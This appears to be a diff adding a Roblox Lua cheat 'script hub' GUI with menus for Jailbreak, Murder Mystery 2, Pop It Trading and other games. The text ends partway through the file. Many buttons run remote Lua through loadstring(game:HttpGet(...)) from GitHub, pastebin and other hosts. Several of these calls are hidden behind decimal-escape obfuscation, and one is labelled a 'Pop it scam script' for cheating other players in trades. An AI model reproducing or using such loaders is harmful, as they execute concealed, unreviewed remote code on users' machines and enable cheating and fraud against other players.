@@ -1,0 +1,1060 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local piekornik = Instance.new("ScreenGui")
+local scripts = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
+local LumberTycoon2 = Instance.new("Frame")
+local shortcut = Instance.new("TextButton")
+local ancestor = Instance.new("TextButton")
+local ancestor2 = Instance.new("TextButton")
+local TextLabel_2 = Instance.new("TextLabel")
+local Home = Instance.new("Frame")
+local TextLabel_3 = Instance.new("TextLabel")
+local TextLabel_4 = Instance.new("TextLabel")
+local ImageLabel = Instance.new("ImageLabel")
+local ScrollingFrame = Instance.new("ScrollingFrame")
+local Home_2 = Instance.new("TextButton")
+local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
+local LumberTycoon2_2 = Instance.new("TextButton")
+local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
+local UIListLayout = Instance.new("UIListLayout")
+local PopIt = Instance.new("TextButton")
+local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")
+local Funky = Instance.new("TextButton")
+local UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")
+local Jailbreak = Instance.new("TextButton")
+local UITextSizeConstraint_5 = Instance.new("UITextSizeConstraint")
+local mm2 = Instance.new("TextButton")
+local UITextSizeConstraint_6 = Instance.new("UITextSizeConstraint")
+local psx = Instance.new("TextButton")
+local UITextSizeConstraint_7 = Instance.new("UITextSizeConstraint")
+local shark = Instance.new("TextButton")
+local UITextSizeConstraint_8 = Instance.new("UITextSizeConstraint")
+local bedwars = Instance.new("TextButton")
+local UITextSizeConstraint_9 = Instance.new("UITextSizeConstraint")
+local bss = Instance.new("TextButton")
+local UITextSizeConstraint_10 = Instance.new("UITextSizeConstraint")
+local artist = Instance.new("TextButton")
+local UITextSizeConstraint_11 = Instance.new("UITextSizeConstraint")
+local PopIt_2 = Instance.new("Frame")
+local shortcut_2 = Instance.new("TextButton")
+local Scam = Instance.new("TextButton")
+local Funky_2 = Instance.new("Frame")
+local shortcut_3 = Instance.new("TextButton")
+local Auto = Instance.new("TextButton")
+local Jailbreak_2 = Instance.new("Frame")
+local shortcut_4 = Instance.new("TextButton")
+local Autorob = Instance.new("TextButton")
+local opscript = Instance.new("TextButton")
+local mm2_2 = Instance.new("Frame")
+local shortcut_5 = Instance.new("TextButton")
+local op = Instance.new("TextButton")
+local psx_2 = Instance.new("Frame")
+local shortcut_6 = Instance.new("TextButton")
+local saza = Instance.new("TextButton")
+local bk = Instance.new("TextButton")
+local void = Instance.new("TextButton")
+local gift = Instance.new("TextButton")
+local shark_2 = Instance.new("Frame")
+local shortcut_7 = Instance.new("TextButton")
+local op_2 = Instance.new("TextButton")
+local bedwars_2 = Instance.new("Frame")
+local shortcut_8 = Instance.new("TextButton")
+local vape = Instance.new("TextButton")
+local artist_2 = Instance.new("Frame")
+local shortcut_9 = Instance.new("TextButton")
+local steal = Instance.new("TextButton")
+local bss_2 = Instance.new("Frame")
+local shortcut_10 = Instance.new("TextButton")
+local kosmoc = Instance.new("TextButton")
+local pepsi = Instance.new("TextButton")
+local histy = Instance.new("TextButton")
+local op_3 = Instance.new("TextButton")
+local TextButton = Instance.new("TextButton")
+local WHITELIST = Instance.new("Frame")
+local TextLabel_5 = Instance.new("TextLabel")
+local TextBox = Instance.new("TextBox")
+local TextButton_2 = Instance.new("TextButton")
+local allow = false
+
+--Properties:
+
+piekornik.Name = "piekornik"
+piekornik.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+piekornik.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+scripts.Name = "scripts"
+scripts.Parent = piekornik
+scripts.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+scripts.Position = UDim2.new(0.263565868, 0, 0.292644769, 0)
+scripts.Size = UDim2.new(0.365567476, 0, 0.452269167, 0)
+scripts.Draggable = true
+scripts.Selectable = true
+scripts.Active = true
+scripts.Visible = false
+
+TextLabel.Parent = scripts
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderSizePixel = 0
+TextLabel.Size = UDim2.new(1, 0, 0.114186853, 0)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "piekornik"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+UIAspectRatioConstraint.Parent = TextLabel
+UIAspectRatioConstraint.AspectRatio = 16.091
+
+LumberTycoon2.Name = "LumberTycoon2"
+LumberTycoon2.Parent = scripts
+LumberTycoon2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+LumberTycoon2.LayoutOrder = 1
+LumberTycoon2.Position = UDim2.new(0.233521655, 0, 0.110726647, 0)
+LumberTycoon2.Size = UDim2.new(0.764595091, 0, 0.885813177, 0)
+LumberTycoon2.Visible = false
+
+shortcut.Name = "shortcut"
+shortcut.Parent = LumberTycoon2
+shortcut.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+shortcut.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+shortcut.Font = Enum.Font.GothamBold
+shortcut.Text = "press K to hide ui"
+shortcut.TextColor3 = Color3.fromRGB(255, 255, 255)
+shortcut.TextScaled = true
+shortcut.TextSize = 14.000
+shortcut.TextWrapped = true
+
+ancestor.Name = "ancestor"
+ancestor.Parent = LumberTycoon2
+ancestor.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+ancestor.Position = UDim2.new(0, 0, 0, 56)
+ancestor.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+ancestor.Font = Enum.Font.GothamBold
+ancestor.Text = "Ancestor"
+ancestor.TextColor3 = Color3.fromRGB(255, 255, 255)
+ancestor.TextScaled = true
+ancestor.TextSize = 14.000
+ancestor.TextWrapped = true
+ancestor.MouseButton1Click:Connect(function()
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\65\115\121\110\99\39\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\70\105\110\100\70\105\114\115\116\65\110\99\101\115\116\111\114\47\65\110\99\101\115\116\111\114\86\51\80\117\98\108\105\99\47\109\97\105\110\47\76\117\109\98\101\114\84\121\99\111\111\110\50\39\41\40\41\10")()
+end)
+
+ancestor2.Name = "ancestor2"
+ancestor2.Parent = LumberTycoon2
+ancestor2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+ancestor2.Position = UDim2.new(0, 0, 0, 123)
+ancestor2.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+ancestor2.Font = Enum.Font.GothamBold
+ancestor2.Text = "Ancestor Version 2"
+ancestor2.TextColor3 = Color3.fromRGB(255, 255, 255)
+ancestor2.TextScaled = true
+ancestor2.TextSize = 14.000
+ancestor2.TextWrapped = true
+ancestor2.MouseButton1Click:Connect(function()
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\65\115\121\110\99\39\104\116\116\112\115\58\47\47\97\110\99\101\115\116\111\114\100\101\118\101\108\111\112\109\101\110\116\46\119\116\102\47\108\117\97\47\65\110\99\101\115\116\111\114\86\50\83\111\117\114\99\101\46\108\117\97\39\41\40\41\59\10")()
+end)
+
+TextLabel_2.Parent = LumberTycoon2
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.BorderSizePixel = 0
+TextLabel_2.Position = UDim2.new(0, 342, 0, 230)
+TextLabel_2.Size = UDim2.new(0.248768479, 0, 0.1015625, 0)
+TextLabel_2.Font = Enum.Font.GothamBold
+TextLabel_2.Text = "Made by: Ancestor"
+TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 14.000
+TextLabel_2.TextWrapped = true
+
+Home.Name = "Home"
+Home.Parent = scripts
+Home.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+Home.LayoutOrder = 1
+Home.Position = UDim2.new(0.233521655, 0, 0.110726647, 0)
+Home.Size = UDim2.new(0.764595091, 0, 0.885813177, 0)
+Home.Visible = false
+
+TextLabel_3.Parent = Home
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.BorderSizePixel = 0
+TextLabel_3.Size = UDim2.new(1.0024631, 0, 0.12109375, 0)
+TextLabel_3.Font = Enum.Font.SourceSansBold
+TextLabel_3.Text = "Made by piekornik, I2000FQ#9977"
+TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.TextScaled = true
+TextLabel_3.TextSize = 14.000
+TextLabel_3.TextWrapped = true
+
+TextLabel_4.Parent = Home
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.BackgroundTransparency = 1.000
+TextLabel_4.BorderSizePixel = 0
+TextLabel_4.Position = UDim2.new(0, 0, 0, 224)
+TextLabel_4.Size = UDim2.new(1.0024631, 0, 0.12109375, 0)
+TextLabel_4.Font = Enum.Font.SourceSansBold
+TextLabel_4.Text = "Discrd server: https://discord.gg/KX8a47SfvX"
+TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.TextScaled = true
+TextLabel_4.TextSize = 14.000
+TextLabel_4.TextWrapped = true
+
+ImageLabel.Parent = Home
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.Position = UDim2.new(0, 0, 0, 31)
+ImageLabel.Size = UDim2.new(1, 0, 0.71875, 0)
+ImageLabel.Image = "rbxassetid://9143412583"
+
+ScrollingFrame.Parent = scripts
+ScrollingFrame.Active = true
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+ScrollingFrame.Position = UDim2.new(0, 0, 0.0655133054, 0)
+ScrollingFrame.Size = UDim2.new(0.268629909, 0, 0.885813177, 0)
+ScrollingFrame.ZIndex = 525512
+ScrollingFrame.CanvasSize = UDim2.new(0, 0, 1, 70)
+ScrollingFrame.ScrollBarThickness = 3
+
+Home_2.Name = "Home"
+Home_2.Parent = ScrollingFrame
+Home_2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+Home_2.Position = UDim2.new(0, 0, 0, 28)
+Home_2.Size = UDim2.new(0, 124, 0, 32)
+Home_2.Font = Enum.Font.SourceSans
+Home_2.Text = "Home"
+Home_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Home_2.TextScaled = true
+Home_2.TextSize = 14.000
+Home_2.TextWrapped = true
+Home_2.MouseButton1Click:Connect(function()
+	Home.Visible = true
+	Funky_2.Visible = false
+	Jailbreak_2.Visible = false
+	LumberTycoon2.Visible = false
+	PopIt_2.Visible = false
+	artist_2.Visible = false
+	bedwars_2.Visible = false
+	bss_2.Visible = false
+	mm2_2.Visible = false
+	psx_2.Visible = false
+	shark_2.Visible = false
+	Home_2.Visible = true
+end)
+
+UITextSizeConstraint.Parent = Home_2
+UITextSizeConstraint.MaxTextSize = 32
+
+LumberTycoon2_2.Name = "LumberTycoon2"
+LumberTycoon2_2.Parent = ScrollingFrame
+LumberTycoon2_2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+LumberTycoon2_2.LayoutOrder = 356363636
+LumberTycoon2_2.Position = UDim2.new(0, 0, 0, 28)
+LumberTycoon2_2.Size = UDim2.new(0, 124, 0, 32)
+LumberTycoon2_2.ZIndex = 2
+LumberTycoon2_2.Font = Enum.Font.SourceSans
+LumberTycoon2_2.Text = "Lumber Tycoon 2"
+LumberTycoon2_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+LumberTycoon2_2.TextScaled = true
+LumberTycoon2_2.TextSize = 14.000
+LumberTycoon2_2.TextWrapped = true
+LumberTycoon2_2.MouseButton1Click:Connect(function()
+	LumberTycoon2.Visible = true
+	Funky_2.Visible = false
+	Jailbreak_2.Visible = false
+	Home.Visible = false
+	PopIt_2.Visible = false
+	artist_2.Visible = false
+	bedwars_2.Visible = false
+	bss_2.Visible = false
+	mm2_2.Visible = false
+	psx_2.Visible = false
+	shark_2.Visible = false
+	LumberTycoon2_2.Visible = true
+end)
+
+
+UITextSizeConstraint_2.Parent = LumberTycoon2_2
+UITextSizeConstraint_2.MaxTextSize = 20
+
+UIListLayout.Parent = ScrollingFrame
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+PopIt.Name = "PopIt"
+PopIt.Parent = ScrollingFrame
+PopIt.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+PopIt.LayoutOrder = 356363636
+PopIt.Position = UDim2.new(0, 0, 0, 28)
+PopIt.Size = UDim2.new(0, 124, 0, 32)
+PopIt.ZIndex = 2
+PopIt.Font = Enum.Font.SourceSans
+PopIt.Text = "Pop it trading"
+PopIt.TextColor3 = Color3.fromRGB(255, 255, 255)
+PopIt.TextScaled = true
+PopIt.TextSize = 14.000
+PopIt.TextWrapped = true
+PopIt.MouseButton1Click:Connect(function()
+	PopIt_2.Visible = true
+	Funky_2.Visible = false
+	Jailbreak_2.Visible = false
+	Home.Visible = false
+	LumberTycoon2.Visible = false
+	artist_2.Visible = false
+	bedwars_2.Visible = false
+	bss_2.Visible = false
+	mm2_2.Visible = false
+	psx_2.Visible = false
+	shark_2.Visible = false
+	PopIt.Visible = true
+end)
+
+
+UITextSizeConstraint_3.Parent = PopIt
+UITextSizeConstraint_3.MaxTextSize = 27
+
+Funky.Name = "Funky"
+Funky.Parent = ScrollingFrame
+Funky.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+Funky.LayoutOrder = 356363636
+Funky.Position = UDim2.new(0, 0, 0, 28)
+Funky.Size = UDim2.new(0, 124, 0, 32)
+Funky.ZIndex = 2
+Funky.Font = Enum.Font.SourceSans
+Funky.Text = "Funky Friday"
+Funky.TextColor3 = Color3.fromRGB(255, 255, 255)
+Funky.TextScaled = true
+Funky.TextSize = 14.000
+Funky.TextWrapped = true
+Funky.MouseButton1Click:Connect(function()
+	Funky_2.Visible = true
+	Home.Visible = false
+	Jailbreak_2.Visible = false
+	LumberTycoon2.Visible = false
+	PopIt_2.Visible = false
+	artist_2.Visible = false
+	bedwars_2.Visible = false
+	bss_2.Visible = false
+	mm2_2.Visible = false
+	psx_2.Visible = false
+	shark_2.Visible = false
+	Funky.Visible = true
+end)
+UITextSizeConstraint_4.Parent = Funky
+UITextSizeConstraint_4.MaxTextSize = 27
+
+Jailbreak.Name = "Jailbreak"
+Jailbreak.Parent = ScrollingFrame
+Jailbreak.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+Jailbreak.LayoutOrder = 356363636
+Jailbreak.Position = UDim2.new(0, 0, 0, 28)
+Jailbreak.Size = UDim2.new(0, 124, 0, 32)
+Jailbreak.ZIndex = 2
+Jailbreak.Font = Enum.Font.SourceSans
+Jailbreak.Text = "Jailbreak"
+Jailbreak.TextColor3 = Color3.fromRGB(255, 255, 255)
+Jailbreak.TextScaled = true
+Jailbreak.TextSize = 14.000
+Jailbreak.MouseButton1Click:Connect(function()
+	Jailbreak_2.Visible = true
+	Funky_2.Visible = false
+	PopIt_2.Visible = false
+	Home.Visible = false
+	LumberTycoon2.Visible = false
+	artist_2.Visible = false
+	bedwars_2.Visible = false
+	bss_2.Visible = false
+	mm2_2.Visible = false
+	psx_2.Visible = false
+	shark_2.Visible = false
+	Jailbreak.Visible = true
+end)
+Jailbreak.TextWrapped = true
+
+UITextSizeConstraint_5.Parent = Jailbreak
+UITextSizeConstraint_5.MaxTextSize = 32
+
+mm2.Name = "mm2"
+mm2.Parent = ScrollingFrame
+mm2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+mm2.LayoutOrder = 356363636
+mm2.Position = UDim2.new(0, 0, 0, 28)
+mm2.Size = UDim2.new(0, 124, 0, 32)
+mm2.ZIndex = 2
+mm2.Font = Enum.Font.SourceSans
+mm2.Text = "Murder mystery 2"
+mm2.TextColor3 = Color3.fromRGB(255, 255, 255)
+mm2.TextScaled = true
+mm2.TextSize = 14.000
+mm2.TextWrapped = true
+mm2.MouseButton1Click:Connect(function()
+	mm2_2.Visible = true
+	Funky_2.Visible = false
+	Jailbreak_2.Visible = false
+	Home.Visible = false
+	LumberTycoon2.Visible = false
+	artist_2.Visible = false
+	bedwars_2.Visible = false
+	bss_2.Visible = false
+	PopIt_2.Visible = false
+	psx_2.Visible = false
+	shark_2.Visible = false
+	mm2.Visible = true
+end)
+
+UITextSizeConstraint_6.Parent = mm2
+UITextSizeConstraint_6.MaxTextSize = 20
+
+psx.Name = "psx"
+psx.Parent = ScrollingFrame
+psx.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+psx.LayoutOrder = 356363636
+psx.Position = UDim2.new(0, 0, 0, 28)
+psx.Size = UDim2.new(0, 124, 0, 32)
+psx.ZIndex = 2
+psx.Font = Enum.Font.SourceSans
+psx.Text = "Pet simulator x"
+psx.TextColor3 = Color3.fromRGB(255, 255, 255)
+psx.TextScaled = true
+psx.TextSize = 14.000
+psx.TextWrapped = true
+psx.MouseButton1Click:Connect(function()
+	psx_2.Visible = true
+	Funky_2.Visible = false
+	Jailbreak_2.Visible = false
+	Home.Visible = false
+	LumberTycoon2.Visible = false
+	artist_2.Visible = false
+	bedwars_2.Visible = false
+	bss_2.Visible = false
+	mm2_2.Visible = false
+	PopIt_2.Visible = false
+	shark_2.Visible = false
+	psx.Visible = true
+end)
+
+UITextSizeConstraint_7.Parent = psx
+UITextSizeConstraint_7.MaxTextSize = 23
+
+shark.Name = "shark"
+shark.Parent = ScrollingFrame
+shark.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+shark.LayoutOrder = 356363636
+shark.Position = UDim2.new(0, 0, 0, 28)
+shark.Size = UDim2.new(0, 124, 0, 32)
+shark.ZIndex = 2
+shark.Font = Enum.Font.SourceSans
+shark.Text = "shark bite"
+shark.TextColor3 = Color3.fromRGB(255, 255, 255)
+shark.TextScaled = true
+shark.TextSize = 14.000
+shark.TextWrapped = true
+shark.MouseButton1Click:Connect(function()
+	shark_2.Visible = true
+	Funky_2.Visible = false
+	Jailbreak_2.Visible = false
+	Home.Visible = false
+	LumberTycoon2.Visible = false
+	artist_2.Visible = false
+	bedwars_2.Visible = false
+	bss_2.Visible = false
+	mm2_2.Visible = false
+	psx_2.Visible = false
+	PopIt_2.Visible = false
+	shark.Visible = true
+end)
+
+UITextSizeConstraint_8.Parent = shark
+UITextSizeConstraint_8.MaxTextSize = 32
+
+bedwars.Name = "bedwars"
+bedwars.Parent = ScrollingFrame
+bedwars.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+bedwars.LayoutOrder = 356363636
+bedwars.Position = UDim2.new(0, 0, 0, 28)
+bedwars.Size = UDim2.new(0, 124, 0, 32)
+bedwars.ZIndex = 2
+bedwars.Font = Enum.Font.SourceSans
+bedwars.Text = "bedwars"
+bedwars.TextColor3 = Color3.fromRGB(255, 255, 255)
+bedwars.TextScaled = true
+bedwars.TextSize = 14.000
+bedwars.TextWrapped = true
+bedwars.MouseButton1Click:Connect(function()
+	bedwars_2.Visible = true
+	Funky_2.Visible = false
+	Jailbreak_2.Visible = false
+	Home.Visible = false
+	LumberTycoon2.Visible = false
+	artist_2.Visible = false
+	PopIt_2.Visible = false
+	bss_2.Visible = false
+	mm2_2.Visible = false
+	psx_2.Visible = false
+	shark_2.Visible = false
+	bedwars.Visible = true
+end)
+
+UITextSizeConstraint_9.Parent = bedwars
+UITextSizeConstraint_9.MaxTextSize = 32
+
+bss.Name = "bss"
+bss.Parent = ScrollingFrame
+bss.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+bss.LayoutOrder = 356363636
+bss.Position = UDim2.new(0, 0, 0, 28)
+bss.Size = UDim2.new(0, 124, 0, 32)
+bss.ZIndex = 2
+bss.Font = Enum.Font.SourceSans
+bss.Text = "bee swarm simulator"
+bss.TextColor3 = Color3.fromRGB(255, 255, 255)
+bss.TextScaled = true
+bss.TextSize = 14.000
+bss.TextWrapped = true
+bss.MouseButton1Click:Connect(function()
+	bss_2.Visible = true
+	Funky_2.Visible = false
+	Jailbreak_2.Visible = false
+	Home.Visible = false
+	LumberTycoon2.Visible = false
+	artist_2.Visible = false
+	bedwars_2.Visible = false
+	PopIt_2.Visible = false
+	mm2_2.Visible = false
+	psx_2.Visible = false
+	shark_2.Visible = false
+	bss.Visible = true
+end)
+
+UITextSizeConstraint_10.Parent = bss
+UITextSizeConstraint_10.MaxTextSize = 32
+
+artist.Name = "artist"
+artist.Parent = ScrollingFrame
+artist.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+artist.LayoutOrder = 356363636
+artist.Position = UDim2.new(0, 0, 0, 28)
+artist.Size = UDim2.new(0, 124, 0, 32)
+artist.ZIndex = 2
+artist.Font = Enum.Font.SourceSans
+artist.Text = "starving artist"
+artist.TextColor3 = Color3.fromRGB(255, 255, 255)
+artist.TextScaled = true
+artist.TextSize = 14.000
+artist.TextWrapped = true
+artist.MouseButton1Click:Connect(function()
+	artist_2.Visible = true
+	Funky_2.Visible = false
+	Jailbreak_2.Visible = false
+	Home.Visible = false
+	LumberTycoon2.Visible = false
+	PopIt_2.Visible = false
+	bedwars_2.Visible = false
+	bss_2.Visible = false
+	mm2_2.Visible = false
+	psx_2.Visible = false
+	shark_2.Visible = false
+	artist.Visible = true
+end)
+
+UITextSizeConstraint_11.Parent = artist
+UITextSizeConstraint_11.MaxTextSize = 27
+
+PopIt_2.Name = "PopIt"
+PopIt_2.Parent = scripts
+PopIt_2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+PopIt_2.LayoutOrder = 1
+PopIt_2.Position = UDim2.new(0.233521655, 0, 0.110726647, 0)
+PopIt_2.Size = UDim2.new(0.764595091, 0, 0.885813177, 0)
+PopIt_2.Visible = false
+
+shortcut_2.Name = "shortcut"
+shortcut_2.Parent = PopIt_2
+shortcut_2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+shortcut_2.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+shortcut_2.Font = Enum.Font.GothamBold
+shortcut_2.Text = "press K to hide ui"
+shortcut_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+shortcut_2.TextScaled = true
+shortcut_2.TextSize = 14.000
+shortcut_2.TextWrapped = true
+
+Scam.Name = "Scam"
+Scam.Parent = PopIt_2
+Scam.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+Scam.Position = UDim2.new(0, 0, 0, 64)
+Scam.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+Scam.Font = Enum.Font.GothamBold
+Scam.Text = "Pop it scam script"
+Scam.TextColor3 = Color3.fromRGB(255, 255, 255)
+Scam.TextScaled = true
+Scam.TextSize = 14.000
+Scam.TextWrapped = true
+Scam.MouseButton1Click:Connect(function()
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\104\120\70\71\120\110\105\69\34\41\44\116\114\117\101\41\41\40\41\10")()
+end)
+
+Funky_2.Name = "Funky"
+Funky_2.Parent = scripts
+Funky_2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+Funky_2.LayoutOrder = 1
+Funky_2.Position = UDim2.new(0.233755246, 0, 0.112454057, 0)
+Funky_2.Size = UDim2.new(0.764595091, 0, 0.885813177, 0)
+Funky_2.Visible = false
+
+shortcut_3.Name = "shortcut"
+shortcut_3.Parent = Funky_2
+shortcut_3.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+shortcut_3.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+shortcut_3.Font = Enum.Font.GothamBold
+shortcut_3.Text = "press K to hide ui"
+shortcut_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+shortcut_3.TextScaled = true
+shortcut_3.TextSize = 14.000
+shortcut_3.TextWrapped = true
+
+Auto.Name = "Auto"
+Auto.Parent = Funky_2
+Auto.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+Auto.Position = UDim2.new(0, 0, 0, 64)
+Auto.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+Auto.Font = Enum.Font.GothamBold
+Auto.Text = "Auto Play"
+Auto.TextColor3 = Color3.fromRGB(255, 255, 255)
+Auto.TextScaled = true
+Auto.TextSize = 14.000
+Auto.TextWrapped = true
+Auto.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/funky-friday-autoplay/main/main.lua",true))()
+end)
+
+Jailbreak_2.Name = "Jailbreak"
+Jailbreak_2.Parent = scripts
+Jailbreak_2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+Jailbreak_2.LayoutOrder = 1
+Jailbreak_2.Position = UDim2.new(0.233521655, 0, 0.110726647, 0)
+Jailbreak_2.Size = UDim2.new(0.764595091, 0, 0.885813177, 0)
+Jailbreak_2.Visible = false
+
+shortcut_4.Name = "shortcut"
+shortcut_4.Parent = Jailbreak_2
+shortcut_4.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+shortcut_4.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+shortcut_4.Font = Enum.Font.GothamBold
+shortcut_4.Text = "press K to hide ui"
+shortcut_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+shortcut_4.TextScaled = true
+shortcut_4.TextSize = 14.000
+shortcut_4.TextWrapped = true
+
+Autorob.Name = "Autorob"
+Autorob.Parent = Jailbreak_2
+Autorob.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+Autorob.Position = UDim2.new(0, 0, 0, 64)
+Autorob.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+Autorob.Font = Enum.Font.GothamBold
+Autorob.Text = "Auto rob"
+Autorob.TextColor3 = Color3.fromRGB(255, 255, 255)
+Autorob.TextScaled = true
+Autorob.TextSize = 14.000
+Autorob.TextWrapped = true
+Autorob.MouseButton1Click:Connect(function()
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\119\97\119\115\100\97\115\100\97\99\120\47\111\104\97\115\99\114\105\112\116\110\114\114\101\119\97\100\105\110\103\47\109\97\105\110\47\106\98\115\97\120\99\114\105\112\116\105\100\107\49\34\41\41\40\41\59\10")()
+end)
+
+opscript.Name = "opscript"
+opscript.Parent = Jailbreak_2
+opscript.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+opscript.Position = UDim2.new(0, 0, 0, 128)
+opscript.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+opscript.Font = Enum.Font.GothamBold
+opscript.Text = "OP JAILBREAK SCRIPT"
+opscript.TextColor3 = Color3.fromRGB(255, 255, 255)
+opscript.TextScaled = true
+opscript.TextSize = 14.000
+opscript.TextWrapped = true
+opscript.MouseButton1Click:Connect(function()
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\114\111\106\101\99\116\101\118\111\46\120\121\122\47\115\99\114\105\112\116\47\108\111\97\100\101\114\46\108\117\97\34\41\41\40\41\10")()
+end)
+
+mm2_2.Name = "mm2"
+mm2_2.Parent = scripts
+mm2_2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+mm2_2.LayoutOrder = 1
+mm2_2.Position = UDim2.new(0.233521655, 0, 0.110726647, 0)
+mm2_2.Size = UDim2.new(0.764595091, 0, 0.885813177, 0)
+mm2_2.Visible = false
+
+shortcut_5.Name = "shortcut"
+shortcut_5.Parent = mm2_2
+shortcut_5.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+shortcut_5.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+shortcut_5.Font = Enum.Font.GothamBold
+shortcut_5.Text = "press K to hide ui"
+shortcut_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+shortcut_5.TextScaled = true
+shortcut_5.TextSize = 14.000
+shortcut_5.TextWrapped = true
+
+op.Name = "op"
+op.Parent = mm2_2
+op.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+op.Position = UDim2.new(0, 0, 0, 64)
+op.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+op.Font = Enum.Font.GothamBold
+op.Text = "OP MURDER MYSTERY 2 SCRIPT"
+op.TextColor3 = Color3.fromRGB(255, 255, 255)
+op.TextScaled = true
+op.TextSize = 14.000
+op.TextWrapped = true
+op.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Ethanoj1/EclipseMM2/master/Script'),true))()
+end)
+
+psx_2.Name = "psx"
+psx_2.Parent = scripts
+psx_2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+psx_2.LayoutOrder = 1
+psx_2.Position = UDim2.new(0.233521655, 0, 0.110726647, 0)
+psx_2.Size = UDim2.new(0.764595091, 0, 0.885813177, 0)
+psx_2.Visible = false
+
+shortcut_6.Name = "shortcut"
+shortcut_6.Parent = psx_2
+shortcut_6.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+shortcut_6.Size = UDim2.new(0.997536957, 0, 0.12109375, 0)
+shortcut_6.Font = Enum.Font.GothamBold
+shortcut_6.Text = "press K to hide ui"
